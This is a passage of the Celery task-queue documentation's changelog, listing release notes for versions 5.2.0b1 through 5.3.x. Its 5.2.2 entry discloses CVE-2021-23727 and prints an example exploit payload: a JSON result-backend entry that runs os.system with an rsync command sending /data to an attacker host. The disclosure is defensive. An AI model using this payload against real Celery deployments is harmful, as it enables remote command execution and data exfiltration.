(#8552)\n\nBasic ElasticSearch / ElasticClient 8.x Support (#8519)\n\nFix eager tasks does not populate name field (#8486)\n\nFix typo in celery.app.control (#8563)\n\nUpdate solar.txt ephem (#8566)\n\nUpdate test.txt pytest-timeout (#8565)\n\nCorrect some mypy errors (#8570)\n\nUpdate elasticsearch.txt (#8573)\n\nUpdate test.txt deps (#8574)\n\nUpdate test.txt (#8590)\n\nImproved the “Next steps” documentation (#8561). (#8600)\n\nDisabled couchbase tests due to broken package breaking main (#8602)\n\nUpdate elasticsearch deps (#8605)\n\nUpdate cryptography==41.0.5 (#8604)\n\nUpdate pytest==7.4.3 (#8606)\n\ntest initial support of python 3.12.x (#8549)\n\nupdated new versions to fix CI (#8607)\n\nUpdate zstd.txt (#8609)\n\nFixed CI Support with Python 3.12 (#8611)\n\nupdated CI, docs and classifier for next release (#8613)\n\nupdated dockerfile to add python 3.12 (#8614)\n\nlint,mypy,docker-unit-tests -> Python 3.12 (#8617)\n\nCorrect type of request in task_revoked documentation (#8616)\n\nupdate docs docker image (#8618)\n\nFixed RecursionError caused by giving config_from_object nested mod… (#8619)\n\nFix: serialization error when gossip working (#6566)\n\n[documentation] broker_connection_max_retries of 0 does not mean “retry forever” (#8626)\n\nadded 2 debian package for better stability in Docker (#8629)\n\n5.3.4\nrelease-date:\n\n2023-09-03 10:10 P.M GMT+2\n\nrelease-by:\n\nTomer Nosrati\n\nWarning\n\nThis version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:\n\nRevert “store children with database backend” (#8475)\n\nRevert “Fix eager tasks does not populate name field” (#8476)\n\nBugfix: Removed unecessary stamping code from _chord.run() (#8339)\n\nUser guide fix (hotfix for #1755) (#8342)\n\nstore children with database backend (#8338)\n\nStamping bugfix with group/chord header errback linking (#8347)\n\nUse argsrepr and kwargsrepr in LOG_RECEIVED (#8301)\n\nFixing minor typo in code example in calling.rst (#8366)\n\nadd documents for timeout settings (#8373)\n\nfix: copyright year (#8380)\n\nsetup.py: enable include_package_data (#8379)\n\nFix eager tasks does not populate name field (#8383)\n\nUpdate test.txt dependencies (#8389)\n\nUpdate auth.txt deps (#8392)\n\nFix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (#8391)\n\nSupport preload options for shell and purge commands (#8374)\n\nImplement safer ArangoDB queries (#8351)\n\nintegration test: cleanup worker after test case (#8361)\n\nAdded “Tomer Nosrati” to CONTRIBUTORS.txt (#8400)\n\nUpdate README.rst (#8404)\n\nUpdate README.rst (#8408)\n\nfix(canvas): add group index when unrolling tasks (#8427)\n\nfix(beat): debug statement should only log AsyncResult.id if it exists (#8428)\n\nLint fixes & pre-commit autoupdate (#8414)\n\nUpdate auth.txt (#8435)\n\nUpdate mypy on test.txt (#8438)\n\nadded missing kwargs arguments in some cli cmd (#8049)\n\nFix #8431: Set format_date to False when calling _get_result_meta on mongo backend (#8432)\n\nDocs: rewrite out-of-date code (#8441)\n\nLimit redis client to 4.x since 5.x fails the test suite (#8442)\n\nLimit tox to < 4.9 (#8443)\n\nFixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren’t reliable (#8446)\n\ndoc update from #7651 (#8451)\n\nRemove tox version limit (#8464)\n\nFixed AttributeError: ‘str’ object has no attribute (#8463)\n\nUpgraded Kombu from 5.3.1 -> 5.3.2 (#8468)\n\nDocument need for CELERY_ prefix on CLI env vars (#8469)\n\nUse string value for CELERY_SKIP_CHECKS envvar (#8462)\n\nRevert “store children with database backend” (#8475)\n\nRevert “Fix eager tasks does not populate name field” (#8476)\n\nUpdate Changelog (#8474)\n\nRemove as it seems to be buggy. (#8340)\n\nRevert “Add Semgrep to CI” (#8477)\n\nRevert “Revert “Add Semgrep to CI”” (#8478)\n\n5.3.3 (Yanked)\nrelease-date:\n\n2023-08-31 1:47 P.M GMT+2\n\nrelease-by:\n\nTomer Nosrati\n\nWarning\n\nThis version has been yanked due to breaking API changes. The breaking changes include:\n\nStore children with database backend (#8338)\n\nFix eager tasks does not populate name field (#8383)\n\nFixed changelog for 5.3.2 release docs.\n\n5.3.2 (Yanked)\nrelease-date:\n\n2023-08-31 1:30 P.M GMT+2\n\nrelease-by:\n\nTomer Nosrati\n\nWarning\n\nThis version has been yanked due to breaking API changes. The breaking changes include:\n\nStore children with database backend (#8338)\n\nFix eager tasks does not populate name field (#8383)\n\nBugfix: Removed unecessary stamping code from _chord.run() (#8339)\n\nUser guide fix (hotfix for #1755) (#8342)\n\nStore children with database backend (#8338)\n\nStamping bugfix with group/chord header errback linking (#8347)\n\nUse argsrepr and kwargsrepr in LOG_RECEIVED (#8301)\n\nFixing minor typo in code example in calling.rst (#8366)\n\nAdd documents for timeout settings (#8373)\n\nFix: copyright year (#8380)\n\nSetup.py: enable include_package_data (#8379)\n\nFix eager tasks does not populate name field (#8383)\n\nUpdate test.txt dependencies (#8389)\n\nUpdate auth.txt deps (#8392)\n\nFix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (#8391)\n\nSupport preload options for shell and purge commands (#8374)\n\nImplement safer ArangoDB queries (#8351)\n\nIntegration test: cleanup worker after test case (#8361)\n\nAdded “Tomer Nosrati” to CONTRIBUTORS.txt (#8400)\n\nUpdate README.rst (#8404)\n\nUpdate README.rst (#8408)\n\nFix(canvas): add group index when unrolling tasks (#8427)\n\nFix(beat): debug statement should only log AsyncResult.id if it exists (#8428)\n\nLint fixes & pre-commit autoupdate (#8414)\n\nUpdate auth.txt (#8435)\n\nUpdate mypy on test.txt (#8438)\n\nAdded missing kwargs arguments in some cli cmd (#8049)\n\nFix #8431: Set format_date to False when calling _get_result_meta on mongo backend (#8432)\n\nDocs: rewrite out-of-date code (#8441)\n\nLimit redis client to 4.x since 5.x fails the test suite (#8442)\n\nLimit tox to < 4.9 (#8443)\n\nFixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren’t reliable (#8446)\n\nDoc update from #7651 (#8451)\n\nRemove tox version limit (#8464)\n\nFixed AttributeError: ‘str’ object has no attribute (#8463)\n\nUpgraded Kombu from 5.3.1 -> 5.3.2 (#8468)\n\n5.3.1\nrelease-date:\n\n2023-06-18 8:15 P.M GMT+6\n\nrelease-by:\n\nAsif Saif Uddin\n\nUpgrade to latest pycurl release (#7069).\n\nLimit librabbitmq>=2.0.0; python_version < ‘3.11’ (#8302).\n\nAdded initial support for python 3.11 (#8304).\n\nChainMap observers fix (#8305).\n\nRevert optimization CLI flag behaviour back to original.\n\nRestrict redis 4.5.5 as it has severe bugs (#8317).\n\nTested pypy 3.10 version in CI (#8320).\n\nBump new version of kombu to 5.3.1 (#8323).\n\nFixed a small float value of retry_backoff (#8295).\n\nLimit pyro4 up to python 3.10 only as it is (#8324).\n\n5.3.0\nrelease-date:\n\n2023-06-06 12:00 P.M GMT+6\n\nrelease-by:\n\nAsif Saif Uddin\n\nTest kombu 5.3.0 & minor doc update (#8294).\n\nUpdate librabbitmq.txt > 2.0.0 (#8292).\n\nUpgrade syntax to py3.8 (#8281).\n\n5.3.0rc2\nrelease-date:\n\n2023-05-31 9:00 P.M GMT+6\n\nrelease-by:\n\nAsif Saif Uddin\n\nAdd missing dependency.\n\nFix exc_type being the exception instance rather.\n\nFixed revoking tasks by stamped headers (#8269).\n\nSupport sqlalchemy 2.0 in tests (#8271).\n\nFix docker (#8275).\n\nUpdate redis.txt to 4.5 (#8278).\n\nUpdate kombu>=5.3.0rc2.\n\n5.3.0rc1\nrelease-date:\n\n2023-05-11 4:24 P.M GMT+2\n\nrelease-by:\n\nTomer Nosrati\n\nfix functiom name by @cuishuang in #8087\n\nUpdate CELERY_TASK_EAGER setting in user guide by @thebalaa in #8085\n\nStamping documentation fixes & cleanups by @Nusnus in #8092\n\nswitch to maintained pyro5 by @auvipy in #8093\n\nudate dependencies of tests by @auvipy in #8095\n\ncryptography==39.0.1 by @auvipy in #8096\n\nAnnotate celery/security/certificate.py by @Kludex in #7398\n\nDeprecate parse_iso8601 in favor of fromisoformat by @stumpylog in #8098\n\npytest==7.2.2 by @auvipy in #8106\n\nType annotations for celery/utils/text.py by @max-muoto in #8107\n\nUpdate web framework URLs by @sblondon in #8112\n\nFix contribution URL by @sblondon in #8111\n\nTrying to clarify CERT_REQUIRED by @pamelafox in #8113\n\nFix potential AttributeError on ‘stamps’ by @Darkheir in #8115\n\nType annotations for celery/apps/beat.py by @max-muoto in #8108\n\nFixed bug where retrying a task loses its stamps by @Nusnus in #8120\n\nType hints for celery/schedules.py by @max-muoto in #8114\n\nReference Gopher Celery in README by @marselester in #8131\n\nUpdate sqlalchemy.txt by @auvipy in #8136\n\nazure-storage-blob 12.15.0 by @auvipy in #8137\n\ntest kombu 5.3.0b3 by @auvipy in #8138\n\nfix: add expire string parse. by @Bidaya0 in #8134\n\nFix worker crash on un-pickleable exceptions by @youtux in #8133\n\nCLI help output: avoid text rewrapping by click by @woutdenolf in #8152\n\nWarn when an unnamed periodic task override another one. by @iurisilvio in #8143\n\nFix Task.handle_ignore not wrapping exceptions properly by @youtux in #8149\n\nHotfix for (#8120) - Stamping bug with retry by @Nusnus in #8158\n\nFix integration test by @youtux in #8156\n\nFixed bug in revoke_by_stamped_headers where impl did not match doc by @Nusnus in #8162\n\nAlign revoke and revoke_by_stamped_headers return values (terminate=True) by @Nusnus in #8163\n\nUpdate & simplify GHA pip caching by @stumpylog in #8164\n\nUpdate auth.txt by @auvipy in #8167\n\nUpdate test.txt versions by @auvipy in #8173\n\nremove extra = from test.txt by @auvipy in #8179\n\nUpdate sqs.txt kombu[sqs]>=5.3.0b3 by @auvipy in #8174\n\nAdded signal triggered before fork by @jaroslawporada in #8177\n\nUpdate documentation on SQLAlchemy by @max-muoto in #8188\n\nDeprecate pytz and use zoneinfo by @max-muoto in #8159\n\nUpdate dev.txt by @auvipy in #8192\n\nUpdate test.txt by @auvipy in #8193\n\nUpdate test-integration.txt by @auvipy in #8194\n\nUpdate zstd.txt by @auvipy in #8195\n\nUpdate s3.txt by @auvipy in #8196\n\nUpdate msgpack.txt by @auvipy in #8199\n\nUpdate solar.txt by @auvipy in #8198\n\nAdd Semgrep to CI by @Nusnus in #8201\n\nAdded semgrep to README.rst by @Nusnus in #8202\n\nUpdate django.txt by @auvipy in #8197\n\nUpdate redis.txt 4.3.6 by @auvipy in #8161\n\nstart removing codecov from pypi by @auvipy in #8206\n\nUpdate test.txt dependencies by @auvipy in #8205\n\nImproved doc for: worker_deduplicate_successful_tasks by @Nusnus in #8209\n\nRenamed revoked_headers to revoked_stamps by @Nusnus in #8210\n\nEnsure argument for map is JSON serializable by @candleindark in #8229\n\n5.3.0b2\nrelease-date:\n\n2023-02-19 1:47 P.M GMT+2\n\nrelease-by:\n\nAsif Saif Uddin\n\nBLM-2: Adding unit tests to chord clone by @Nusnus in #7668\n\nFix unknown task error typo by @dcecile in #7675\n\nrename redis integration test class so that tests are executed by @wochinge in #7684\n\nCheck certificate/private key type when loading them by @qrmt in #7680\n\nAdded integration test_chord_header_id_duplicated_on_rabbitmq_msg_duplication() by @Nusnus in #7692\n\nNew feature flag: allow_error_cb_on_chord_header - allowing setting an error callback on chord header by @Nusnus in #7712\n\nUpdate README.rst sorting Python/Celery versions by @andrebr in #7714\n\nFixed a bug where stamping a chord body would not use the correct stamping method by @Nusnus in #7722\n\nFixed doc duplication typo for Signature.stamp() by @Nusnus in #7725\n\nFix issue 7726: variable used in finally block may not be instantiated by @woutdenolf in #7727\n\nFixed bug in chord stamping with another chord as a body + unit test by @Nusnus in #7730\n\nUse “describe_table” not “create_table” to check for existence of DynamoDB table by @maxfirman in #7734\n\nEnhancements for task_allow_error_cb_on_chord_header tests and docs by @Nusnus in #7744\n\nImproved custom stamping visitor documentation by @Nusnus in #7745\n\nImproved the coverage of test_chord_stamping_body_chord() by @Nusnus in #7748\n\nbilliard >= 3.6.3.0,<5.0 for rpm by @auvipy in #7764\n\nFixed memory leak with ETA tasks at connection error when worker_cancel_long_running_tasks_on_connection_loss is enabled by @Nusnus in #7771\n\nFixed bug where a chord with header of type tuple was not supported in the link_error flow for task_allow_error_cb_on_chord_header flag by @Nusnus in #7772\n\nScheduled weekly dependency update for week 38 by @pyup-bot in #7767\n\nrecreate_module: set spec to the new module by @skshetry in #7773\n\nOverride integration test config using integration-tests-config.json by @thedrow in #7778\n\nFixed error handling bugs due to upgrade to a newer version of billiard by @Nusnus in #7781\n\nDo not recommend using easy_install anymore by @jugmac00 in #7789\n\nGitHub Workflows security hardening by @sashashura in #7768\n\nUpdate ambiguous acks_late doc by @Zhong-z in #7728\n\nbilliard >=4.0.2,<5.0 by @auvipy in #7720\n\nimportlib_metadata remove deprecated entry point interfaces by @woutdenolf in #7785\n\nScheduled weekly dependency update for week 41 by @pyup-bot in #7798\n\npyzmq>=22.3.0 by @auvipy in #7497\n\nRemove amqp from the BACKEND_ALISES list by @Kludex in #7805\n\nReplace print by logger.debug by @Kludex in #7809\n\nIgnore coverage on except ImportError by @Kludex in #7812\n\nAdd mongodb dependencies to test.txt by @Kludex in #7810\n\nFix grammar typos on the whole project by @Kludex in #7815\n\nRemove isatty wrapper function by @Kludex in #7814\n\nRemove unused variable _range by @Kludex in #7813\n\nAdd type annotation on concurrency/threads.py by @Kludex in #7808\n\nFix linter workflow by @Kludex in #7816\n\nScheduled weekly dependency update for week 42 by @pyup-bot in #7821\n\nRemove .cookiecutterrc by @Kludex in #7830\n\nRemove .coveragerc file by @Kludex in #7826\n\nkombu>=5.3.0b2 by @auvipy in #7834\n\nFix readthedocs build failure by @woutdenolf in #7835\n\nFixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by @Nusnus in #7825\n\nStabilized test_mutable_errback_called_by_chord_from_group_fail_multiple by @Nusnus in #7837\n\nUse SPDX license expression in project metadata by @RazerM in #7845\n\nNew control command revoke_by_stamped_headers by @Nusnus in #7838\n\nClarify wording in Redis priority docs by @strugee in #7853\n\nFix non working example of using celery_worker pytest fixture by @paradox-lab in #7857\n\nRemoved the mandatory requirement to include stamped_headers key when implementing on_signature() by @Nusnus in #7856\n\nUpdate serializer docs by @sondrelg in #7858\n\nRemove reference to old Python version by @Kludex in #7829\n\nAdded on_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by @Nusnus in #7860\n\nAdd clarifying information to completed_count documentation by @hankehly in #7873\n\nStabilized test_revoked_by_headers_complex_canvas by @Nusnus in #7877\n\nStampingVisitor will visit the callbacks and errbacks of the signature by @Nusnus in #7867\n\nFix “rm: no operand” error in clean-pyc script by @hankehly in #7878\n\nAdd –skip-checks flag to bypass django core checks by @mudetz in #7859\n\nScheduled weekly dependency update for week 44 by @pyup-bot in #7868\n\nAdded two new unit tests to callback stamping by @Nusnus in #7882\n\nSphinx extension: use inspect.signature to make it Python 3.11 compatible by @mathiasertl in #7879\n\ncryptography==38.0.3 by @auvipy in #7886\n\nCanvas.py doc enhancement by @Nusnus in #7889\n\nFix typo by @sondrelg in #7890\n\nfix typos in optional tests by @hsk17 in #7876\n\nCanvas.py doc enhancement by @Nusnus in #7891\n\nFix revoke by headers tests stability by @Nusnus in #7892\n\nfeat: add global keyprefix for backend result keys by @kaustavb12 in #7620\n\nCanvas.py doc enhancement by @Nusnus in #7897\n\nfix(sec): upgrade sqlalchemy to 1.2.18 by @chncaption in #7899\n\nCanvas.py doc enhancement by @Nusnus in #7902\n\nFix test warnings by @ShaheedHaque in #7906\n\nSupport for out-of-tree worker pool implementations by @ShaheedHaque in #7880\n\nCanvas.py doc enhancement by @Nusnus in #7907\n\nUse bound task in base task example. Closes #7909 by @WilliamDEdwards in #7910\n\nAllow the stamping visitor itself to set the stamp value type instead of casting it to a list by @Nusnus in #7914\n\nStamping a task left the task properties dirty by @Nusnus in #7916\n\nFixed bug when chaining a chord with a group by @Nusnus in #7919\n\nFixed bug in the stamping visitor mechanism where the request was lacking the stamps in the ‘stamps’ property by @Nusnus in #7928\n\nFixed bug in task_accepted() where the request was not added to the requests but only to the active_requests by @Nusnus in #7929\n\nFix bug in TraceInfo._log_error() where the real exception obj was hiding behind ‘ExceptionWithTraceback’ by @Nusnus in #7930\n\nAdded integration test: test_all_tasks_of_canvas_are_stamped() by @Nusnus in #7931\n\nAdded new example for the stamping mechanism: examples/stamping by @Nusnus in #7933\n\nFixed a bug where replacing a stamped task and stamping it again by @Nusnus in #7934\n\nBugfix for nested group stamping on task replace by @Nusnus in #7935\n\nAdded integration test test_stamping_example_canvas() by @Nusnus in #7937\n\nFixed a bug in losing chain links when unchaining an inner chain with links by @Nusnus in #7938\n\nRemoving as not mandatory by @auvipy in #7885\n\nHousekeeping for Canvas.py by @Nusnus in #7942\n\nScheduled weekly dependency update for week 50 by @pyup-bot in #7954\n\ntry pypy 3.9 in CI by @auvipy in #7956\n\nsqlalchemy==1.4.45 by @auvipy in #7943\n\nbilliard>=4.1.0,<5.0 by @auvipy in #7957\n\nfeat(typecheck): allow changing type check behavior on the app level; by @moaddib666 in #7952\n\nAdd broker_channel_error_retry option by @nkns165 in #7951\n\nAdd beat_cron_starting_deadline_seconds to prevent unwanted cron runs by @abs25 in #7945\n\nScheduled weekly dependency update for week 51 by @pyup-bot in #7965\n\nAdded doc to “retry_errors” newly supported field of “publish_retry_policy” of the task namespace by @Nusnus in #7967\n\nRenamed from master to main in the docs and the CI workflows by @Nusnus in #7968\n\nFix docs for the exchange to use with worker_direct by @alessio-b2c2 in #7973\n\nPin redis==4.3.4 by @auvipy in #7974\n\nreturn list of nodes to make sphinx extension compatible with Sphinx 6.0 by @mathiasertl in #7978\n\nuse version range redis>=4.2.2,<4.4.0 by @auvipy in #7980\n\nScheduled weekly dependency update for week 01 by @pyup-bot in #7987\n\nAdd annotations to minimise differences with celery-aio-pool’s tracer.py. by @ShaheedHaque in #7925\n\nFixed bug where linking a stamped task did not add the stamp to the link’s options by @Nusnus in #7992\n\nsqlalchemy==1.4.46 by @auvipy in #7995\n\npytz by @auvipy in #8002\n\nFix few typos, provide configuration + workflow for codespell to catch any new by @yarikoptic in #8023\n\nRabbitMQ links update by @arnisjuraga in #8031\n\nIgnore files generated by tests by @Kludex in #7846\n\nRevert “sqlalchemy==1.4.46 (#7995)” by @Nusnus in #8033\n\nFixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by @Nusnus in #8034\n\nFixed formatting in setup.cfg that caused flake8 to misbehave by @Nusnus in #8044\n\nRemoved duplicated import Iterable by @Nusnus in #8046\n\nFix docs by @Nusnus in #8047\n\nDocument –logfile default by @strugee in #8057\n\nStamping Mechanism Refactoring by @Nusnus in #8045\n\nresult_backend_thread_safe config shares backend across threads by @CharlieTruong in #8058\n\nFix cronjob that use day of month and negative UTC timezone by @pkyosx in #8053\n\nStamping Mechanism Examples Refactoring by @Nusnus in #8060\n\nFixed bug in Task.on_stamp_replaced() by @Nusnus in #8061\n\nStamping Mechanism Refactoring 2 by @Nusnus in #8064\n\nChanged default append_stamps from True to False (meaning duplicates … by @Nusnus in #8068\n\ntypo in comment: mailicious => malicious by @yanick in #8072\n\nFix command for starting flower with specified broker URL by @ShukantPal in #8071\n\nImprove documentation on ETA/countdown tasks (#8069) by @norbertcyran in #8075\n\n5.3.0b1\nrelease-date:\n\n2022-08-01 5:15 P.M UTC+6:00\n\nrelease-by:\n\nAsif Saif Uddin\n\nCanvas Header Stamping (#7384).\n\nasync chords should pass it’s kwargs to the group/body.\n\nbeat: Suppress banner output with the quiet option (#7608).\n\nFix honor Django’s TIME_ZONE setting.\n\nDon’t warn about DEBUG=True for Django.\n\nFixed the on_after_finalize cannot access tasks due to deadlock.\n\nBump kombu>=5.3.0b1,<6.0.\n\nMake default worker state limits configurable (#7609).\n\nOnly clear the cache if there are no active writers.\n\nBilliard 4.0.1\n\n5.3.0a1\nrelease-date:\n\n2022-06-29 5:15 P.M UTC+6:00\n\nrelease-by:\n\nAsif Saif Uddin\n\nRemove Python 3.4 compatibility code.\n\ncall ping to set connection attr for avoiding redis parse_response error.\n\nUse importlib instead of deprecated pkg_resources.\n\nfix #7245 uid duplicated in command params.\n\nFix subscribed_to maybe empty (#7232).\n\nFix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) #7290.\n\nAdd security_key_password option (#7292).\n\nLimit elasticsearch support to below version 8.0.\n\ntry new major release of pytest 7 (#7330).\n\nbroker_connection_retry should no longer apply on startup (#7300).\n\nRemove __ne__ methods (#7257).\n\nfix #7200 uid and gid.\n\nRemove exception-throwing from the signal handler.\n\nAdd mypy to the pipeline (#7383).\n\nExpose more debugging information when receiving unknown tasks. (#7405)\n\nAvoid importing buf_t from billiard’s compat module as it was removed.\n\nAvoid negating a constant in a loop. (#7443)\n\nEnsure expiration is of float type when migrating tasks (#7385).\n\nload_extension_class_names - correct module_name (#7406)\n\nBump pymongo[srv]>=4.0.2.\n\nUse inspect.getgeneratorstate in asynpool.gen_not_started (#7476).\n\nFix test with missing .get() (#7479).\n\nazure-storage-blob>=12.11.0\n\nMake start_worker, setup_default_app reusable outside of pytest.\n\nEnsure a proper error message is raised when id for key is empty (#7447).\n\nCrontab string representation does not match UNIX crontab expression.\n\nWorker should exit with ctx.exit to get the right exitcode for non-zero.\n\nFix expiration check (#7552).\n\nUse callable built-in.\n\nInclude dont_autoretry_for option in tasks. (#7556)\n\nfix: Syntax error in arango query.\n\nFix custom headers propagation on task retries (#7555).\n\nSilence backend warning when eager results are stored.\n\nReduce prefetch count on restart and gradually restore it (#7350).\n\nImprove workflow primitive subclassing (#7593).\n\ntest kombu>=5.3.0a1,<6.0 (#7598).\n\nCanvas Header Stamping (#7384).\n\n5.2.7\nrelease-date:\n\n2022-5-26 12:15 P.M UTC+2:00\n\nrelease-by:\n\nOmer Katz\n\nFix packaging issue which causes poetry 1.2b1 and above to fail install Celery (#7534).\n\n5.2.6\nrelease-date:\n\n2022-4-04 21:15 P.M UTC+2:00\n\nrelease-by:\n\nOmer Katz\n\nload_extension_class_names - correct module_name (#7433).\n\nThis fixes a regression caused by #7218.\n\n5.2.5\nrelease-date:\n\n2022-4-03 20:42 P.M UTC+2:00\n\nrelease-by:\n\nOmer Katz\n\nThis release was yanked due to a regression caused by the PR below\n\nUse importlib instead of deprecated pkg_resources (#7218).\n\n5.2.4\nrelease-date:\n\n2022-4-03 20:30 P.M UTC+2:00\n\nrelease-by:\n\nOmer Katz\n\nExpose more debugging information when receiving unknown tasks (#7404).\n\n5.2.3\nrelease-date:\n\n2021-12-29 12:00 P.M UTC+6:00\n\nrelease-by:\n\nAsif Saif Uddin\n\nAllow redis >= 4.0.2.\n\nUpgrade minimum required pymongo version to 3.11.1.\n\ntested pypy3.8 beta (#6998).\n\nSplit Signature.__or__ into subclasses’ __or__ (#7135).\n\nPrevent duplication in event loop on Consumer restart.\n\nRestrict setuptools>=59.1.1,<59.7.0.\n\nKombu bumped to v5.2.3\n\npy-amqp bumped to v5.0.9\n\nSome docs & CI improvements.\n\n5.2.2\nrelease-date:\n\n2021-12-26 16:30 P.M UTC+2:00\n\nrelease-by:\n\nOmer Katz\n\nVarious documentation fixes.\n\nFix CVE-2021-23727 (Stored Command Injection security vulnerability).\n\nWhen a task fails, the failure information is serialized in the backend. In some cases, the exception class is only importable from the consumer’s code base. In this case, we reconstruct the exception class so that we can re-raise the error on the process which queried the task’s result. This was introduced in #4836. If the recreated exception type isn’t an exception, this is a security issue. Without the condition included in this patch, an attacker could inject a remote code execution instruction such as: os.system(\"rsync /data attacker@192.168.56.100:~/data\") by setting the task’s result to a failure in the result backend with the os, the system function as the exception type and the payload rsync /data attacker@192.168.56.100:~/data as the exception arguments like so:\n\n{\n      \"exc_module\": \"os\",\n      'exc_type': \"system\",\n      \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"\n}\n\n\nAccording to my analysis, this vulnerability can only be exploited if the producer delayed a task which runs long enough for the attacker to change the result mid-flight, and the producer has polled for the task’s result. The attacker would also have to gain access to the result backend. The severity of this security vulnerability is low, but we still recommend upgrading.\n\n5.2.1\nrelease-date:\n\n2021-11-16 8.55 P.M UTC+6:00\n\nrelease-by:\n\nAsif Saif Uddin\n\nFix rstrip usage on bytes instance in ProxyLogger.\n\nPass logfile to ExecStop in celery.service example systemd file.\n\nfix: reduce latency of AsyncResult.get under gevent (#7052)\n\nLimit redis version: <4.0.0.\n\nBump min kombu version to 5.2.2.\n\nChange pytz>dev to a PEP 440 compliant pytz>0.dev.0.\n\nRemove dependency to case (#7077).\n\nfix: task expiration is timezone aware if needed (#7065).\n\nInitial testing of pypy-3.8 beta to CI.\n\nDocs, CI & tests cleanups.\n\n5.2.0\nrelease-date:\n\n2021-11-08 7.15 A.M UTC+6:00\n\nrelease-by:\n\nAsif Saif Uddin\n\nPrevent from subscribing to empty channels (#7040)\n\nfix register_task method.\n\nFire task failure signal on final reject (#6980)\n\nLimit pymongo version: <3.12.1 (#7041)\n\nBump min kombu version to 5.2.1\n\n5.2.0rc2\nrelease-date:\n\n2021-11-02 1.54 P.M UTC+3:00\n\nrelease-by:\n\nNaomi Elstein\n\nBump Python 3.10.0 to rc2.\n\n[pre-commit.ci] pre-commit autoupdate (#6972).\n\nautopep8.\n\nPrevent worker to send expired revoked items upon hello command (#6975).\n\ndocs: clarify the ‘keeping results’ section (#6979).\n\nUpdate deprecated task module removal in 5.0 documentation (#6981).\n\n[pre-commit.ci] pre-commit autoupdate.\n\ntry python 3.10 GA.\n\nmention python 3.10 on readme.\n\nDocumenting the default consumer_timeout value for rabbitmq >= 3.8.15.\n\nAzure blockblob backend parametrized connection/read timeouts (#6978).\n\nAdd as_uri method to azure block blob backend.\n\nAdd possibility to override backend implementation with celeryconfig (#6879).\n\n[pre-commit.ci] pre-commit autoupdate.\n\ntry to fix deprecation warning.\n\n[pre-commit.ci] pre-commit autoupdate.\n\nnot needed anyore.\n\nnot needed anyore.\n\nnot used anymore.\n\nadd github discussions forum\n\n5.2.0rc1\nrelease-date:\n\n2021-09-26 4.04 P.M UTC+3:00\n\nrelease-by:\n\nOmer Katz\n\nKill all workers when main process exits in prefork model (#6942).\n\ntest kombu 5.2.0rc1 (#6947).\n\ntry moto 2.2.x (#6948).\n\nPrepared Hacker News Post on Release Action.\n\nupdate setup with python 3.7 as minimum.\n\nupdate kombu on setupcfg.\n\nAdded note about automatic killing all child processes of worker after its termination.\n\n[pre-commit.ci] pre-commit autoupdate.\n\nMove importskip before greenlet import (#6956).\n\namqp: send expiration field to broker if requested by user (#6957).\n\nSingle line drift warning.\n\ncanvas: fix kwargs argument to prevent recursion (#6810) (#6959).\n\nAllow to enable Events with app.conf mechanism.\n\nWarn when expiration date is in the past.\n\nAdd the Framework :: Celery trove classifier.\n\nGive indication whether the task is replacing another (#6916).\n\nMake setup.py executable.\n\nBump version: 5.2.0b3 → 5.2.0rc1.\n\n5.2.0b3\nrelease-date:\n\n2021-09-02 8.38 P.M UTC+3:00\n\nrelease-by:\n\nOmer Katz\n\nAdd args to LOG_RECEIVED (fixes #6885) (#6898).\n\nTerminate job implementation for eventlet concurrency backend (#6917).\n\nAdd cleanup implementation to filesystem backend (#6919).\n\n[pre-commit.ci] pre-commit autoupdate (#69).\n\nAdd before_start hook (fixes #4110) (#6923).\n\nRestart consumer if connection drops (#6930).\n\nRemove outdated optimization documentation (#6933).\n\nadded https verification check functionality in arangodb backend (#6800).\n\nDrop Python 3.6 support.\n\nupdate supported python versions on readme.\n\n[pre-commit.ci] pre-commit autoupdate (#6935).\n\nRemove appveyor configuration since we migrated to GA.\n\npyugrade is now set to upgrade code to 3.7.\n\nDrop exclude statement since we no longer test with pypy-3.6.\n\n3.10 is not GA so it’s not supported yet.\n\nCelery 5.1 or earlier support Python 3.6.\n\nFix linting error.\n\nfix: Pass a Context when chaining fail results (#6899).\n\nBump version: 5.2.0b2 → 5.2.0b3.\n\n5.2.0b2\nrelease-date:\n\n2021-08-17 5.35 P.M UTC+3:00\n\nrelease-by:\n\nOmer Katz\n\nTest windows on py3.10rc1 and pypy3.7 (#6868).\n\nRoute chord_unlock task to the same queue as chord body (#6896).\n\nAdd message properties to app.tasks.Context (#6818).\n\nhandle already converted LogLevel and JSON (#6915).\n\n5.2 is codenamed dawn-chorus.\n\nBump version: 5.2.0b1 → 5.2.0b2.\n\n5.2.0b1\nrelease-date:\n\n2021-08-11 5.42 P.M UTC+3:00\n\nrelease-by:\n\nOmer Katz\n\nAdd Python 3.10 support (#6807).\n\nFix docstring for Signal.send to match code (#6835).\n\nNo blank line in log output (#6838).\n\nChords get body_type independently to handle cases where body.type does not exist (#6847).\n\nFix #6844 by allowing safe queries via app.inspect().active() (#6849).\n\nFix multithreaded backend usage (#6851).\n\nFix Open Collective donate button (#6848).\n\nFix setting worker concurrency option after signal (#6853).\n\nMake ResultSet.on_ready promise hold a weakref to self (#6784).\n\nUpdate configuration.rst.\n\nDiscard jobs on flush if synack isn’t enabled (#6863).\n\nBump click version to 8.0 (#6861).\n\nAmend IRC network link to Libera (#6837).\n\nImport celery lazily in pytest plugin and unignore flake8 F821, “undefined name ‘…’” (#6872).\n\nFix inspect –json output to return valid json without –quiet.\n\nRemove celery.task references in modules, docs (#6869).\n\nThe Consul backend must correctly associate requests and responses (#6823).\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nFrequently Asked Questions\n\nNext topic\n\nAPI Reference\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Change history\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491592,
    "timestamp": "2026-02-23T00:13:49.450Z",
    "title": "Internals — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/internals/index.html",
